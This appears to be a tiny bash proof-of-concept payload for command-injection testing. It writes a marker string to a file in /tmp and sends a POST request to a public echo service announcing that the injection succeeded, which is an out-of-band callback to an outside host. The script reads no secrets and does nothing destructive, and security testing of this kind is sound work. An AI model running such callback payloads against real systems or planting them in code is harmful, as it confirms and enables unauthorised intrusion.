#!/bin/bash
echo "COMMAND_INJECTION_TEST_SUCCESS" > /tmp/injection_proof.txt
curl -X POST https://postman-echo.com/post -d "injection=success"
